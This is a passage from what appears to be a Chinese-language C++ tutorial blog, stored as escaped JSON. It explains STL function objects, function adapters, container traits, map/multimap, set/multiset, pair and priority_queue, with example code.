v2.push_back(i); &#125; vector&lt;int&gt;::iterator it; int a = 4; Isdiv&lt;int&gt; mydiv(a); // _InIt find_if(_InIt _First, _InIt _Last, _Pr _Pred) //返回的是迭代器 it = find_if(v2.begin(), v2.end(), Isdiv&lt;int&gt;(4)); if (it != v2.end()) &#123; cout &lt;&lt; &quot;第一个被4整除的数是：&quot; &lt;&lt; *it &lt;&lt; endl; &#125;&#125; 二元函数对象案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253template &lt;typename T&gt;struct SumAdd&#123; T operator()(T &amp;t1, T &amp;t2) &#123; return t1 + t2; &#125;&#125;;template &lt;typename T&gt;void printE(T &amp;t)&#123; for (vector&lt;int&gt;::iterator it = t.begin(); it!=t.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void printVector(vector&lt;int&gt; &amp;v)&#123; for (vector&lt;int&gt;::iterator it = v.begin(); it!=v.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void main14()&#123; vector&lt;int&gt; v1, v2 ; vector&lt;int&gt; v3; v1.push_back(1); v1.push_back(2); v1.push_back(3); v2.push_back(4); v2.push_back(5); v2.push_back(6); v3.resize(10); //transform(v1.begin(), v1.end(), v2.begin(),v3.begin(), SumAdd&lt;int&gt;()); /* template&lt;class _InIt1, class _InIt2, class _OutIt, class _Fn2&gt; inline _OutIt transform(_InIt1 _First1, _InIt1 _Last1, _InIt2 _First2, _OutIt _Dest, _Fn2 _Func) */ vector&lt;int&gt;::iterator it = transform(v1.begin(), v1.end(), v2.begin(),v3.begin(), SumAdd&lt;int&gt;()); cout &lt;&lt; *it &lt;&lt; endl; printE(v3); &#125; 二元谓词案例 1234567891011121314151617181920212223242526272829void current(int &amp;v)&#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;;&#125;bool MyCompare(const int &amp;a, const int &amp;b)&#123; return a &lt; b;&#125;void main15()&#123; vector&lt;int&gt; v(10); for (int i=0; i&lt;10; i++) &#123; v[i] = rand() % 100; &#125; for_each(v.begin(), v.end(), current); printf(&quot;\\n&quot;); sort(v.begin(), v.end(), MyCompare ); printf(&quot;\\n&quot;); for (int i=0; i&lt;10; i++) &#123; printf(&quot;%d &quot;, v[i]); &#125; printf(&quot;\\n&quot;);&#125; 预定义函数对象和函数适配器 预定义函数对象基本概念：标准模板库STL提前定义了很多预定义函数对象，#include &lt;functional&gt; 必须包含。 1234567891011121314151617181920212223242526272829//1使用预定义函数对象：//类模板plus&lt;&gt; 的实现了： 不同类型的数据进行加法运算void main41()&#123; plus&lt;int&gt; intAdd; int x = 10; int y = 20; int z = intAdd(x, y); //等价于 x + y cout &lt;&lt; z &lt;&lt; endl; plus&lt;string&gt; stringAdd; string myc = stringAdd(&quot;aaa&quot;, &quot;bbb&quot;); cout &lt;&lt; myc &lt;&lt; endl; vector&lt;string&gt; v1; v1.push_back(&quot;bbb&quot;); v1.push_back(&quot;aaa&quot;); v1.push_back(&quot;ccc&quot;); v1.push_back(&quot;zzzz&quot;); //缺省情况下，sort()用底层元素类型的小于操作符以升序排列容器的元素。 //为了降序，可以传递预定义的类模板greater,它调用底层元素类型的大于操作符： cout &lt;&lt; &quot;sort()函数排序&quot; &lt;&lt; endl;; sort(v1.begin(), v1.end(), greater&lt;string&gt;() ); //从大到小 for (vector&lt;string&gt;::iterator it=v1.begin(); it!=v1.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; endl; &#125;&#125; 算术函数对象 123456789101112预定义的函数对象支持加、减、乘、除、求余和取反。调用的操作符是与type相关联的实例加法：plus&lt;Types&gt;plus&lt;string&gt; stringAdd;sres = stringAdd(sva1,sva2);减法：minus&lt;Types&gt;乘法：multiplies&lt;Types&gt;除法divides&lt;Tpye&gt;求余：modulus&lt;Tpye&gt;取反：negate&lt;Type&gt;negate&lt;int&gt; intNegate;ires = intNegate(ires);Ires= UnaryFunc(negate&lt;int&gt;(),Ival1); 关系函数对象 12345678等于equal_to&lt;Tpye&gt;equal_to&lt;string&gt; stringEqual;sres = stringEqual(sval1,sval2);不等于not_equal_to&lt;Type&gt;大于 greater&lt;Type&gt;大于等于greater_equal&lt;Type&gt;小于 less&lt;Type&gt;小于等于less_equal&lt;Type&gt; 12345678910111213void main42()&#123; vector&lt;string&gt; v1; v1.push_back(&quot;bbb&quot;); v1.push_back(&quot;aaa&quot;); v1.push_back(&quot;ccc&quot;); v1.push_back(&quot;zzzz&quot;); v1.push_back(&quot;ccc&quot;); string s1 = &quot;ccc&quot;; //int num = count_if(v1.begin(),v1.end(), equal_to&lt;string&gt;(),s1); int num = count_if(v1.begin(),v1.end(),bind2nd(equal_to&lt;string&gt;(), s1)); cout &lt;&lt; num &lt;&lt; endl;&#125; 逻辑函数对象 123456789逻辑与 logical_and&lt;Type&gt;logical_and&lt;int&gt; indAnd;ires = intAnd(ival1,ival2);dres=BinaryFunc( logical_and&lt;double&gt;(),dval1,dval2);逻辑或 logical_or&lt;Type&gt;逻辑非 logical_not&lt;Type&gt;logical_not&lt;int&gt; IntNot;Ires = IntNot(ival1);Dres=UnaryFunc( logical_not&lt;double&gt;,dval1); 函数适配器 ​ 函数适配器的理论知识 常用函数函数适配器 标准库提供一组函数适配器，用来特殊化或者扩展一元和二元函数对象。常用适配器是： 1绑定器（binder）: binder通过把二元函数对象的一个实参绑定到一个特殊的值上，将其转换成一元函数对象。C＋＋标准库提供两种预定义的binder适配器：bind1st和bind2nd，前者把值绑定到二元函数对象的第一个实参上，后者绑定在第二个实参上。 2取反器(negator) : negator是一个将函数对象的值翻转的函数适配器。标准库提供两个预定义的ngeator适配器：not1翻转一元预定义函数对象的真值,而not2翻转二元谓词函数的真值。 常用函数适配器列表如下： bind1st(op, value) bind2nd(op, value) not1(op) not2(op) mem_fun_ref(op) mem_fun(op) ptr_fun(op) 3）常用函数适配器案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class IsGreat&#123;public: IsGreat(int i) &#123; m_num = i; &#125; bool operator()(int &amp;num) &#123; if (num &gt; m_num) &#123; return true; &#125; return false; &#125;protected:private: int m_num;&#125;;void main43()&#123; vector&lt;int&gt; v1; for (int i=0; i&lt;5; i++) &#123; v1.push_back(i+1); &#125; for (vector&lt;int&gt;::iterator it = v1.begin(); it!=v1.end(); it ++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot; ; &#125; int num1 = count(v1.begin(), v1.end(), 3); cout &lt;&lt; &quot;num1:&quot; &lt;&lt; num1 &lt;&lt; endl; //通过谓词求大于2的个数 int num2 = count_if(v1.begin(), v1.end(), IsGreat(2)); cout &lt;&lt; &quot;num2:&quot; &lt;&lt; num2 &lt;&lt; endl; //通过预定义函数对象求大于2的个数 greater&lt;int&gt;() 有2个参数 // param &gt; 2 int num3 = count_if(v1.begin(), v1.end(), bind2nd(greater&lt;int&gt;(), 2 ) ); cout &lt;&lt; &quot;num3:&quot; &lt;&lt; num3 &lt;&lt; endl; //取模 能被2整除的数 求奇数 int num4 = count_if(v1.begin(), v1.end(), bind2nd(modulus &lt;int&gt;(), 2 ) ); cout &lt;&lt; &quot;奇数num4:&quot; &lt;&lt; num4 &lt;&lt; endl; int num5 = count_if(v1.begin(), v1.end(), not1( bind2nd(modulus &lt;int&gt;(), 2 ) ) ); cout &lt;&lt; &quot;偶数num5:&quot; &lt;&lt; num5 &lt;&lt; endl; return ;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;using namespace std;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;functional&gt;class MyPrint:public binary_function&lt;int,int,void&gt;&#123;public: void operator()(int v, int start) const &#123; cout &lt;&lt; &quot;v=&quot; &lt;&lt; v &lt;&lt; &quot;start=&quot; &lt;&lt; start &lt;&lt; &quot;v+start=&quot; &lt;&lt; v + start &lt;&lt; endl; &#125;&#125;;void test01()&#123; vector&lt;int&gt;v; for (int i = 0; i &lt; 10; i++) &#123; v.push_back(i); &#125; cout &lt;&lt; &quot;请输入一个起始值：&quot; &lt;&lt; endl; int num; cin &gt;&gt; num; //for_each(v.begin(), v.end(), bind2nd (MyPrint(),num)); for_each(v.begin(), v.end(), bind1st(MyPrint(), num));&#125;//第一步，绑定数据 bind2nd//第二步，继承类 binary_function&lt;参数类型1，参数类型2，返回值类型&gt;//第三步，加const修饰operator()int main()&#123; test01(); system(&quot;pause&quot;); return 0;&#125; 取反适配器 1234567891011121314151617181920212223242526272829303132333435363738394041424344class MyPrint:public binary_function&lt;int,int,void&gt;&#123;public: void operator()(int v, int start) const &#123; cout &lt;&lt; &quot;v=&quot; &lt;&lt; v &lt;&lt; &quot;start=&quot; &lt;&lt; start &lt;&lt; &quot;v+start=&quot; &lt;&lt; v + start &lt;&lt; endl; &#125;&#125;; //取反适配器class CreateThenFive:public unary_function&lt;int,bool&gt;&#123;public: bool operator()(int v)const &#123; return v &gt; 5; &#125;&#125;; void test02() &#123; //一元取反 vector&lt;int&gt;v; for (int i = 0; i &lt; 10; i++) &#123; v.push_back(i); &#125; //查找大于5的数字 //需求改为找小于5的数字 //vector&lt;int&gt;::iterator pos=find_if(v.begin(), v.end(),not1 (CreateThenFive())); vector&lt;int&gt;::iterator pos=find_if(v.begin(), v.end(),not1(bind2nd(greater&lt;int&gt;(),5))); if (pos != v.end()) &#123; cout &lt;&lt; &quot;找到大于5的数字为：&quot; &lt;&lt;*pos&lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;未找到&quot; &lt;&lt; endl; &#125;&#125;//一元取反适配器 not1//继承unary_fuction&lt;类型1，返回值类型&gt;//const 10.3.2.8 STL的容器算法迭代器的设计理念 1） STL的容器通过类模板技术，实现数据类型和容器模型的分离。 2） STL的迭代器技术实现了遍历容器的统一方法；也为STL的算法提供了统一性 3） STL的函数对象实现了自定义数据类型的算法运算。（算法和） 4） 具体例子：transform算法的输入，通过迭代器first和last指向的元算作为输入；通过result作为输出；通过函数对象来做自定义数据类型的运算。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"容器共性机制研究","slug":"cpp0087-容器共性机制研究","date":"2021-07-05T06:41:46.000Z","updated":"2021-12-28T18:40:11.628Z","comments":true,"path":"2021/07/05/cpp0087-容器共性机制研究/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0087-容器共性机制研究/","excerpt":"","text":"容器的共通能力 C++模板是容器的概念。 理论提高：所有容器提供的都是值（value）语意，而非引用（reference）语意。容器执行插入元素的操作时，内部实施拷贝动作。所以STL容器内存储的元素必须能够被拷贝（必须提供拷贝构造函数）。 除了queue与stack外，每个容器都提供可返回迭代器的函数，运用返回的迭代器就可以访问元素。 通常STL不会丢出异常。要求使用者确保传入正确的参数。 每个容器都提供了一个默认构造函数跟一个默认拷贝构造函数。 如已有容器vecIntA。 vector&lt;int&gt; vecIntB(vecIntA); //调用拷贝构造函数，复制vecIntA到vecIntB中。 与大小相关的操作方法(c代表容器)： c.size(); //返回容器中元素的个数 c.empty(); //判断容器是否为空 比较操作(c1,c2代表容器)： c1 == c2 判断c1是否等于c2 c1 != c2 判断c1是否不等于c2 c1 = c2 把c2的所有元素指派给c1 各个容器的使用时机 deque的使用场景：比如排队购票系统，对排队者的存储可以采用deque，支持头端的快速移除，尾端的快速添加。如果采用vector，则头端移除时，会移动大量的数据，速度慢。 vector与deque的比较： 一：vector.at()比deque.at()效率高，比如vector.at(0)是固定的，deque的开始位置却是不固定的。 二：如果有大量释放操作的话，vector花的时间更少，这跟二者的内部实现有关。 三：deque支持头部的快速插入与快速移除，这是deque的优点。 list的使用场景：比如公交车乘客的存储，随时可能有乘客下车，支持频繁的不确实位置元素的移除插入。 set的使用场景：比如对手机游戏的个人得分记录的存储，存储要求从高分到低分的顺序排列。 map的使用场景：比如按ID号存储十万个用户，想要快速要通过ID查找对应的用户。二叉树的查找效率，这时就体现出来了。如果是vector容器，最坏的情况下可能要遍历完整个容器才能找到该用户。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"Map和multimap容器","slug":"cpp0086-Map和multimap容器","date":"2021-07-05T06:30:26.000Z","updated":"2021-12-28T18:40:08.627Z","comments":true,"path":"2021/07/05/cpp0086-Map和multimap容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0086-Map和multimap容器/","excerpt":"","text":"Map和multimap容器 map是标准的关联式容器，一个map是一个键值对序列，即(key,value)对。它提供基于key的快速检索能力。 map中key值是唯一的。集合中的元素按一定的顺序排列。元素插入过程是按排序规则插入，所以不能指定插入位置。 map的具体实现采用红黑树变体的平衡二叉树的数据结构。在插入操作和删除操作上比vector快。 map可以直接存取key所对应的value，支持[]操作符，如map[key]=value。 multimap与map的区别：map支持唯一键值，每个键只能出现一次；而multimap中相同键可以出现多次。multimap不支持[]操作符。 #include &lt;map&gt; map/multimap对象的默认构造 1234567map/multimap采用模板类实现，对象的默认构造形式：map&lt;T1,T2&gt; mapTT; multimap&lt;T1,T2&gt; multimapTT; 如：map&lt;int, char&gt; mapA;map&lt;string,float&gt; mapB;//其中T1,T2还可以用各种指针类型或自定义类型 map的插入与迭代器 map.insert(…); //往容器插入元素，返回pair&lt;iterator,bool&gt; 在map中插入元素的三种方式： 假设 map&lt;int, string&gt; mapStu; 一、通过pair的方式插入对象 mapStu.insert( pair&lt;int,string&gt;(3,“小张”) ); 二、通过pair的方式插入对象 mapStu.inset(make_pair(-1, “校长-1”)); 三、通过value_type的方式插入对象 mapStu.insert( map&lt;int,string&gt;::value_type(1,“小李”) ); 四、通过数组的方式插入值 mapStu[3] = “小刘&quot;; mapStu[5] = “小王&quot;； ​ 前三种方法，采用的是insert()方法，该方法返回值为pair 第四种方法非常直观，但存在一个性能的问题。插入3时，先在mapStu中查找主键为3的项，若没发现，则将一个键为3，值为初始化值的对组插入到mapStu中，然后再将值修改成“小刘”。若发现已存在3这个键，则修改这个键对应的value。 string strName = mapStu[2]; //取操作或插入操作 只有当mapStu存在2这个键时才是正确的取操作，否则会自动插入一个实例，键为2，值为初始化值。 1234567891011121314151617181920212223假设 map&lt;int, string&gt; mapA;pair&lt; map&lt;int,string&gt;::iterator, bool &gt; pairResult = mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); //插入方式一int iFirstFirst = (pairResult.first)-&gt;first; //iFirst == 3;string strFirstSecond = (pairResult.first)-&gt;second; //strFirstSecond为&quot;小张&quot;bool bSecond = pairResult.second; //bSecond == true; mapA.insert(map&lt;int,string&gt;::value_type(1,&quot;小李&quot;)); //插入方式二mapA[3] = &quot;小刘&quot;; //修改valuemapA[5] = &quot;小王&quot;; //插入方式三string str1 = mapA[2]; //执行插入 string() 操作，返回的str1的字符串内容为空。string str2 = mapA[3]; //取得value，str2为&quot;小刘&quot;//迭代器遍历 for (map&lt;int,string&gt;::iterator it=mapA.begin(); it!=mapA.end(); ++it) &#123; pair&lt;int, string&gt; pr = *it; int iKey = pr.first; string strValue = pr.second; &#125; 12345678map&lt;T1,T2,less&lt;T1&gt; &gt; mapA; //该容器是按键的升序方式排列元素。未指定函数对象，默认采用less&lt;T1&gt;函数对象。map&lt;T1,T2,greater&lt;T1&gt;&gt; mapB; //该容器是按键的降序方式排列元素。less&lt;T1&gt;与greater&lt;T1&gt; 可以替换成其它的函数对象functor。可编写自定义函数对象以进行自定义类型的比较，使用方法与set构造时所用的函数对象一样。map.begin(); //返回容器中第一个数据的迭代器。map.end(); //返回容器中最后一个数据之后的迭代器。map.rbegin(); //返回容器中倒数第一个元素的迭代器。map.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 map对象的拷贝构造与赋值 123map(const map &amp;mp); //拷贝构造函数map&amp; operator=(const map &amp;mp); //重载等号操作符map.swap(mp); //交换两个集合容器 1234567891011121314例如: map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); map&lt;int ,string&gt; mapB(mapA); //拷贝构造 map&lt;int, string&gt; mapC; mapC = mapA; //赋值 mapC[3] = &quot;老张&quot;; mapC.swap(mapA); //交换 map的大小 12map.size(); //返回容器中元素的数目map.empty();//判断容器是否为空 12345678910map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); if (mapA.empty()) &#123; int iSize = mapA.size(); //iSize == 4 &#125; map的删除 1234map.clear(); //删除所有元素map.erase(pos); //删除pos迭代器所指的元素，返回下一个元素的迭代器。map.erase(beg,end); //删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。map.erase(keyElem); //删除容器中key为keyElem的对组。 12345678910111213141516171819202122232425map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); //删除区间内的元素 map&lt;int,string&gt;::iterator itBegin=mapA.begin(); ++ itBegin; ++ itBegin; map&lt;int,string&gt;::iterator itEnd=mapA.end(); mapA.erase(itBegin,itEnd); //此时容器mapA包含按顺序的&#123;1,&quot;小杨&quot;&#125;&#123;3,&quot;小张&quot;&#125;两个元素。 mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); //删除容器中第一个元素 mapA.erase(mapA.begin()); //此时容器mapA包含了按顺序的&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;三个元素 //删除容器中key为5的元素 mapA.erase(5); //删除mapA的所有元素 mapA.clear(); //容器为空 map的查找 12map.find(key); 查找键key是否存在，若存在，返回该键的元素的迭代器；若不存在，返回map.end();map.count(keyElem); //返回容器中key为keyElem的对组个数。对map来说，要么是0，要么是1。对multimap来说，值可能大于1。 123456789101112map&lt;int,string&gt;::iterator it=mapStu.find(3);if(it == mapStu.end())&#123; //没找到&#125;else&#123; //找到了 pair&lt;int, string&gt; pairStu = *it; int iID = pairStu.first; //或 int iID = it-&gt;first; string strName = pairStu.second; //或 string strName = it-&gt;second;&#125; 1234567map.lower_bound(keyElem); //返回第一个key&gt;=keyElem元素的迭代器。map.upper_bound(keyElem); // 返回第一个key&gt;keyElem元素的迭代器。例如： mapStu是用map&lt;int,string&gt;声明的容器，已包含&#123;1,&quot;小李&quot;&#125;&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;&#123;9,&quot;小陈&quot;&#125;元素。map&lt;int,string&gt;::iterator it;it = mapStu.lower_bound(5); //it-&gt;first==5 it-&gt;second==&quot;小王&quot;it = mapStu.upper_bound(5); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot;it = mapStu.lower_bound(6); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot;it = mapStu.upper_bound(6); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot; 1234567891011map.equal_range(keyElem); //返回容器中key与keyElem相等的上下限的两个迭代器。上限是闭区间，下限是开区间，如[beg,end)。 以上函数返回两个迭代器，而这两个迭代器被封装在pair中。例如 map&lt;int,string&gt; mapStu;... //往mapStu容器插入元素&#123;1,&quot;小李&quot;&#125;&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;&#123;9,&quot;小陈&quot;&#125;pair&lt; map&lt;int,string&gt;::iterator , map&lt;int,string&gt;::iterator &gt; pairIt = mapStu.equal_range(5);map&lt;int, string&gt;::iterator itBeg = pairIt.first;map&lt;int, string&gt;::iterator itEnd = pairIt.second;//此时 itBeg-&gt;first==5 , itEnd-&gt;first == 7,itBeg-&gt;second==&quot;小王&quot;, itEnd-&gt;second==&quot;小赵&quot;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"Set和multiset容器","slug":"cpp0085-Set和multiset容器","date":"2021-07-05T06:17:49.000Z","updated":"2021-12-28T18:40:05.038Z","comments":true,"path":"2021/07/05/cpp0085-Set和multiset容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0085-Set和multiset容器/","excerpt":"","text":"Set和multiset容器 set是一个集合容器，其中所包含的元素是唯一的，集合中的元素按一定的顺序排列。元素插入过程是按排序规则插入，所以不能指定插入位置。 set采用红黑树变体的数据结构实现，红黑树属于平衡二叉树。在插入操作和删除操作上比vector快。 set不可以直接存取元素。（不可以使用at.(pos)与[]操作符）。 multiset与set的区别：set支持唯一键值，每个元素值只能出现一次；而multiset中同一值可以出现多次。 不可以直接修改set或multiset容器中的元素值，因为该类容器是自动排序的。如果希望修改一个元素值，必须先删除原有的元素，再插入新的元素。 #include &lt;set&gt; set/multiset对象的默认构造 123456set&lt;int&gt; setInt; //一个存放int的set容器。set&lt;float&gt; setFloat; //一个存放float的set容器。set&lt;string&gt; setString; //一个存放string的set容器。multiset&lt;int&gt; mulsetInt; //一个存放int的multi set容器。multi set&lt;float&gt; multisetFloat; //一个存放float的multi set容器。multi set&lt;string&gt; multisetString; //一个存放string的multi set容器。 set的插入与迭代器 12345set.insert(elem); //在容器中插入元素。set.begin(); //返回容器中第一个数据的迭代器。set.end(); //返回容器中最后一个数据之后的迭代器。set.rbegin(); //返回容器中倒数第一个元素的迭代器。set.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 12345678910set&lt;int&gt; setInt;setInt.insert(3); setInt.insert(1);setInt.insert(5);setInt.insert(2);for(set&lt;int&gt;::iterator it=setInt.begin(); it!=setInt.end(); ++it)&#123; int iItem = *it; cout &lt;&lt; iItem; //或直接使用cout &lt;&lt; *it&#125;//这样子便顺序输出 1 2 3 5。set.rbegin()与set.rend() Set集合的元素排序 123456789101112131415161718set&lt;int,less&lt;int&gt; &gt; setIntA; //该容器是按升序方式排列元素。set&lt;int,greater&lt;int&gt;&gt; setIntB; //该容器是按降序方式排列元素。set&lt;int&gt; 相当于 set&lt;int,less&lt;int&gt;&gt;。less&lt;int&gt;与greater&lt;int&gt;中的int可以改成其它类型，该类型主要要跟set容纳的数据类型一致。//疑问1：less&lt;&gt;与greater&lt;&gt;是什么？疑问2：如果set&lt;&gt;不包含int类型，而是包含自定义类型，set容器如何排序？要解决如上两个问题，需要了解容器的函数对象，也叫伪函数，英文名叫functor。下面将讲解什么是functor，functor的用法。使用stl提供的函数对象set&lt;int,greater&lt;int&gt;&gt; setIntB; setIntB.insert(3);setIntB.insert(1);setIntB.insert(5);setIntB.insert(2);此时容器setIntB就包含了按顺序的5,3,2,1元素 函数对象functor的用法 尽管函数指针被广泛用于实现函数回调，但C++还提供了一个重要的实现回调函数的方法，那就是函数对象。 functor，翻译成函数对象，伪函数，算符，是重载了“()”操作符的普通类对象。从语法上讲，它与普通函数行为类似。 greater&lt;&gt;与less&lt;&gt;就是函数对象。 下面举出greater&lt;int&gt;的简易实现原理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct greater&#123;bool operator() (const int&amp; iLeft, const int&amp; iRight)&#123; return (iLeft&gt;iRight); //如果是实现less&lt;int&gt;的话，这边是写return (iLeft&lt;iRight);&#125;&#125;容器就是调用函数对象的operator()方法去比较两个值的大小。题目：学生包含学号，姓名属性，现要求任意插入几个学生对象到set容器中，使得容器中的学生按学号的升序排序。解：//学生类class CStudent&#123; public: CStudent(int iID, string strName) &#123; m_iID = iID; m_strName = strName; &#125; int m_iID; //学号 string m_strName; //姓名&#125;//为保持主题鲜明，本类不写拷贝构造函数，本类也不需要写拷贝构造函数。但大家仍要有考虑拷贝构造函数的习惯。//函数对象struct StuFunctor&#123; bool operator() (const CStudent &amp;stu1, const CStudent &amp;stu2) &#123; return (stu1.m_iID&lt;stu2.m_iID); &#125;&#125;//main函数void main()&#123; set&lt;CStudent, StuFunctor&gt; setStu; setStu.insert(CStudent(3,&quot;小张&quot;)); setStu.insert(CStudent(1,&quot;小李&quot;)); setStu.insert(CStudent(5,&quot;小王&quot;)); setStu.insert(CStudent(2,&quot;小刘&quot;)); //此时容器setStu包含了四个学生对象，分别是按姓名顺序的“小李”，“小刘”，“小张”，“小王” &#125; set对象的拷贝构造与赋值 123set(const set &amp;st); //拷贝构造函数set&amp; operator=(const set &amp;st); //重载等号操作符set.swap(st); //交换两个集合容器 1234567891011121314set&lt;int&gt; setIntA; setIntA.insert(3); setIntA.insert(1); setIntA.insert(7); setIntA.insert(5); setIntA.insert(9); set&lt;int&gt; setIntB(setIntA); //1 3 5 7 9 set&lt;int&gt; setIntC; setIntC = setIntA; //1 3 5 7 9 setIntC.insert(6); setIntC.swap(setIntA); //交换 set的大小 12set.size(); //返回容器中元素的数目set.empty();//判断容器是否为空 1234567891011set&lt;int&gt; setIntA; setIntA.insert(3); setIntA.insert(1); setIntA.insert(7); setIntA.insert(5); setIntA.insert(9); if (!setIntA.empty()) &#123; int iSize = setIntA.size(); //5 &#125; set的删除 1234set.clear(); //清除所有元素set.erase(pos); //删除pos迭代器所指的元素，返回下一个元素的迭代器。set.erase(beg,end); //删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。set.erase(elem); //删除容器中值为elem的元素。 1234567891011121314151617181920删除区间内的元素setInt是用set&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9,11元素。set&lt;int&gt;::iterator itBegin=setInt.begin();++ itBegin;set&lt;int&gt;::iterator itEnd=setInt.begin();++ itEnd;++ itEnd;++ itEnd;setInt.erase(itBegin,itEnd);//此时容器setInt包含按顺序的1,6,9,11四个元素。删除容器中第一个元素setInt.erase(setInt.begin()); //6,9,11删除容器中值为9的元素set.erase(9); 删除setInt的所有元素setInt.clear(); //容器为空 set的查找 12345678910set.find(elem); //查找elem元素，返回指向elem元素的迭代器。set.count(elem); //返回容器中值为elem的元素个数。对set来说，要么是0，要么是1。对multiset来说，值可能大于1。set.lower_bound(elem); //返回第一个&gt;=elem元素的迭代器。set.upper_bound(elem); // 返回第一个&gt;elem元素的迭代器。set.equal_range(elem); //返回容器中与elem相等的上下限的两个迭代器。上限是闭区间，下限是开区间，如[beg,end)。 以上函数返回两个迭代器，而这两个迭代器被封装在pair中。以下讲解pair的含义与使用方法。 1234567891011121314151617set&lt;int&gt; setInt; setInt.insert(3); setInt.insert(1); setInt.insert(7); setInt.insert(5); setInt.insert(9); set&lt;int&gt;::iterator itA = setInt.find(5); int iA = *itA; //iA == 5 int iCount = setInt.count(5); //iCount == 1 set&lt;int&gt;::iterator itB = setInt.lower_bound(5); set&lt;int&gt;::iterator itC = setInt.upper_bound(5); int iB = *itB; //iB == 5 int iC = *itC; //iC == 7pair&lt; set&lt;int&gt;::iterator, set&lt;int&gt;::iterator &gt; pairIt = setInt.equal_range(5); //pair是什么？ pair的使用 1234pair译为对组，可以将两个值视为一个单元。pair&lt;T1,T2&gt;存放的两个值的类型，可以不一样，如T1为int，T2为float。T1,T2也可以是自定义类型。pair.first是pair里面的第一个值，是T1类型。pair.second是pair里面的第二个值，是T2类型。 123456set&lt;int&gt; setInt;... //往setInt容器插入元素1,3,5,7,9pair&lt; set&lt;int&gt;::iterator , set&lt;int&gt;::iterator &gt; pairIt = setInt.equal_range(5);set&lt;int&gt;::iterator itBeg = pairIt.first;set&lt;int&gt;::iterator itEnd = pairIt.second;//此时 *itBeg==5 而 *itEnd == 7 小结 一、容器set/multiset的使用方法； ​ 红黑树的变体，查找效率高，插入不能指定位置，插入时自动排序。 二、functor的使用方法； 类似于函数的功能，可用来自定义一些规则，如元素比较规则。 三、pair的使用方法。 ​ 对组，一个整体的单元，存放两个类型(T1,T2，T1可与T2一样)的两个元素。 案例: 123456789101112131415161718192021int x; scanf(&quot;%ld&quot;,&amp;x); multiset&lt;int&gt; h;//建立一个multiset类型，变量名是h，h序列里面存的是int类型,初始h为空 while(x!=0)&#123; h.insert(x);//将x插入h中 scanf(&quot;%ld&quot;,&amp;x); &#125; pair&lt; multiset&lt;int&gt;::iterator , multiset&lt;int&gt;::iterator &gt; pairIt = h.equal_range(22);multiset&lt;int&gt;::iterator itBeg = pairIt.first;multiset&lt;int&gt;::iterator itEnd = pairIt.second;int nBeg = *itBeg;int nEnd = *itEnd; while(!h.empty())&#123;// 序列非空h.empty()==true时表示h已经空了 multiset&lt;int&gt;::iterator c = h.begin();//c指向h序列中第一个元素的地址，第一个元素是最小的元素 printf(&quot;%ld &quot;,*c);//将地址c存的数据输出 h.erase(c);//从h序列中将c指向的元素删除 &#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"优先级队列priority_queue","slug":"cpp0084-优先级队列priority-queue","date":"2021-07-05T06:02:34.000Z","updated":"2021-12-28T18:40:01.713Z","comments":true,"path":"2021/07/05/cpp0084-优先级队列priority-queue/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0084-优先级队列priority-queue/","excerpt":"","text":"优先级队列priority_queue 最大值优先级队列、最小值优先级队列 优先级队列适配器 STL priority_queue 用来开发一些特殊的应用,请对stl的类库,多做扩展性学习 默认是从大到小插入 